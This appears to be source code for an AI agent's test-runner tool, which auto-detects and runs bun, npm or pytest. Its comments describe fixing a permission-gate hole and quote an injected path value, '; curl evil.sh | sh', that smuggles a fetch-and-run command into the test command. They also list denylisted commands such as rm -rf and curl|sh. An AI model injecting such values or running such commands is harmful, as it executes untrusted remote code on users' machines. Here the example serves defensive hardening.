import { z } from "zod"
import { runShell } from "@/runtime"
import { fileExists, readFile } from "@/storage"
import type { Tool, ToolContext, ToolEvent, ToolResultEvidence } from "../types"

const schema = z.object({
  command: z.string().optional().describe("Explicit test command (skips auto-detection)"),
  path: z.string().optional().describe("Optional path/filter passed to the detected runner"),
  timeout_ms: z.number().optional().describe("Timeout in ms (default 120000, max 600000)"),
})

type Input = z.infer<typeof schema>

const DEFAULT_TIMEOUT = 120_000
const MAX_TIMEOUT = 600_000
const TAIL_CAP = 12_000
/** Local stderr-tail cap on `evidence.stderr`. Dispatch re-trims to its own
 *  smaller `STDERR_TAIL_CAP` (2000) as a defense-in-depth backstop. */
const STDERR_EVIDENCE_CAP = 4_000

const has = async (cwd: string, name: string): Promise<boolean> => fileExists(`${cwd}/${name}`)

type PackageJsonLike = {
  scripts?: Record<string, string>
  packageManager?: string
}

/** Read package.json (if any). Returns null on absence or parse failure. */
const readPackageJson = async (cwd: string): Promise<PackageJsonLike | null> => {
  if (!(await has(cwd, "package.json"))) return null
  try {
    return JSON.parse(await readFile(`${cwd}/package.json`)) as PackageJsonLike
  } catch {
    return null
  }
}

/** The closed set of auto-detectable runners. Each entry pins (1) the fixed
 *  command prefix the model cannot influence and (2) how the model-supplied
 *  `path` is interpolated into the executed string. `assembleCommand` is the
 *  SINGLE source for both `detectCommand` (what actually runs) and
 *  `projectShellCommand` (what HARD_DENY inspects) — so the gate can never see
 *  a different string than the one `runShell` executes. */
const RUNNER_PREFIX = { bun: "bun test", npm: "npm test", pytest: "pytest" } as const
type RunnerKind = keyof typeof RUNNER_PREFIX

/** Build the exact shell string a given runner will execute for `path`. npm
 *  forwards the path after a `--` separator; bun/pytest append it directly.
 *  This is the ONLY place the raw `path` is interpolated into a command — both
 *  the executor and the permission projection route through here, so they are
 *  byte-identical by construction (no drift between gate input and runtime). */
const assembleCommand = (runner: RunnerKind, path: string | undefined): string => {
  const prefix = RUNNER_PREFIX[runner]
  if (!path) return prefix
  return runner === "npm" ? `${prefix} -- ${path}` : `${prefix} ${path}`
}

/** Auto-detect a test command. Order: bun (lockb/bunfig/pkg-test-script) →
 *  npm (package.json only) → pytest (pytest.ini/pyproject/setup.py). */
const detectCommand = async (
  cwd: string,
  path: string | undefined,
): Promise<string | undefined> => {
  const pkg = await readPackageJson(cwd)
  const bunMarker =
    (await has(cwd, "bun.lockb")) ||
    (await has(cwd, "bunfig.toml")) ||
    pkg?.packageManager?.toLowerCase().startsWith("bun@") === true
  if (bunMarker) return assembleCommand("bun", path)
  if (pkg !== null) return assembleCommand("npm", path)
  const py =
    (await has(cwd, "pytest.ini")) ||
    (await has(cwd, "pyproject.toml")) ||
    (await has(cwd, "setup.py"))
  if (py) return assembleCommand("pytest", path)
  return undefined
}

/** Synchronous projection of the command HARD_DENY must inspect when no
 *  explicit `command` is given. `detectCommand` is async (it reads the FS to
 *  pick a runner) but `extractShellCommand` is sync, and — critically — the
 *  prefix (`bun`/`npm`/`pytest`) is FIXED text the model cannot poison. The
 *  ONLY attacker-controlled byte is the interpolated `path`, which is identical
 *  across every runner shape modulo the npm `--` separator. So we join the
 *  string for EVERY runner kind: whichever runner `detectCommand` ends up
 *  choosing, its exact executed string is a substring of this projection, and
 *  any HARD_DENY pattern that would fire on the real command (`{path:'; curl
 *  evil.sh | sh'}` → `pytest ; curl evil.sh | sh`) fires here too. With no
 *  `path` there is nothing poisonable, so we return `""` (the fixed shapes
 *  carry no model input — matches the auto-detect/no-path invariant). */
const projectShellCommand = (path: string | undefined): string => {
  if (!path) return ""
  return (Object.keys(RUNNER_PREFIX) as RunnerKind[])
    .map((runner) => assembleCommand(runner, path))
    .join("\n")
}

/** Heuristic one-line verdict from runner output + exit/timeout state. */
const verdict = (combined: string, exitCode: number, timedOut: boolean): string => {
  if (timedOut) return "timed out"
  const text = combined.toLowerCase()
  if (/\b\d+\s+fail|\bfailed\b|✗|✖/.test(text) && exitCode !== 0) return "failed"
  if (exitCode === 0 && /\bpass|\bok\b|✓|✔|\b\d+\s+passed\b/.test(text)) return "passed"
  if (exitCode === 0) return "passed"
  if (exitCode !== 0) return "failed"
  return "unknown"
}

/**
 * Run a project's test suite. Uses an explicit `command` when given, else
 * auto-detects (bun → npm → pytest). NOT read-only and NOT concurrency-safe:
 * arbitrary project tests have side effects and may contend for resources.
 */
export const testRunnerTool: Tool<Input> = {
  name: "test_runner",
  description:
    "Run the project's tests (explicit command or auto-detected: bun/npm/pytest). " +
    "Returns the resolved command, exit status, a trimmed tail, and a verdict.",
  inputSchema: schema,
  isReadOnly: () => false,
  // Executes a test suite with arbitrary side effects; always serialize.
  isConcurrencySafe: () => false,
  // HITL secure-by-default (ADR-0020 follow-up): running the project's own
  // test suite is the canonical inner-loop action — pre-approval covers it.
  // Without this opt-in, the `inferToolTier` fallback for mutating tools
  // would force confirmation on every `bun test` even in `bypass`.
  hitlTier: (): "pre-approval-ok" => "pre-approval-ok",
  // S16 (H2 fix): expose the resolved shell command so the permission policy
  // applies the HARD_DENY denylist (rm -rf, force-push, curl|sh) UNIFORMLY.
  // A model-supplied `command` runs through `runShell` exactly like `bash`, so
  // it MUST face the same denylist — returned verbatim.
  //
  // FAIL-CLOSED parity: when no `command` is given, `execute` does NOT run a
  // fixed shape — it runs `detectCommand`, which interpolates the model's RAW
  // `path` into `bun test ${path}` / `npm test -- ${path}` / `pytest ${path}`.
  // Returning "" here (the old hole) hid that injected path from HARD_DENY, so
  // `{path: '; curl evil.sh | sh'}` reached `bash -lc` un-gated. We now project
  // the SAME interpolated string(s) `detectCommand`/`assembleCommand` will
  // build (single source), so the gate sees and denies the poisoned path. The
  // fixed prefix is the only non-model text, so the no-path case still yields
  // "" (nothing to deny).
  extractShellCommand: (input: Input): string => input.command ?? projectShellCommand(input.path),

  async *execute(input: Input, ctx: ToolContext): AsyncIterable<ToolEvent> {
    const resolved = input.command ?? (await detectCommand(ctx.cwd, input.path))
    if (!resolved) {
      yield {
        type: "result",
        result: {
          ok: false,
          output: "could not auto-detect a test command; pass `command` explicitly",
        },
      }
      return
    }

    yield { type: "progress", message: `running: ${resolved}` }

    const timeoutMs = Math.min(input.timeout_ms ?? DEFAULT_TIMEOUT, MAX_TIMEOUT)
    const r = await runShell(resolved, {
      cwd: ctx.cwd,
      signal: ctx.signal,
      timeoutMs,
      ...(ctx.localEnv !== undefined ? { localEnv: ctx.localEnv } : {}),
    })

    const combined = [r.stdout, r.stderr].filter(Boolean).join("\n").trimEnd()
    const tail =
      combined.length > TAIL_CAP
        ? `… (truncated ${combined.length - TAIL_CAP} chars)\n${combined.slice(-TAIL_CAP)}`
        : combined
    const status = r.timedOut ? "timed out" : `exit ${r.exitCode}`
    const v = verdict(combined, r.exitCode, r.timedOut)
    const ok = r.exitCode === 0 && !r.timedOut

    // RFC-0002 §5.2 evidence (CR3: typed, not duck-smuggled). Conditional
    // spread keeps `exactOptionalPropertyTypes` happy when stderr is empty.
    const evidence: ToolResultEvidence = {
      ...(r.stderr ? { stderr: r.stderr.slice(-STDERR_EVIDENCE_CAP) } : {}),
      exitCode: r.exitCode,
      executedCommand: resolved,
    }

    yield {
      type: "result",
      result: {
        ok,
        output: `$ ${resolved}\n[${status}] verdict: ${v}\n${tail || "(no output)"}`,
        evidence,
      },
    }
  },
}

/** Test-only re-exports. The two pure heuristics — `verdict` (output+exit→one
 *  line) and `detectCommand` (marker-file probe order + path forwarding) — are
 *  otherwise private, so the leaf-unit hellgate pins their boundary semantics
 *  (word-boundary regex, exit/verdict interplay, probe precedence) directly
 *  instead of driving them through `execute`. Logic is byte-identical; this is
 *  export-only. */
export const __test = { verdict, detectCommand }
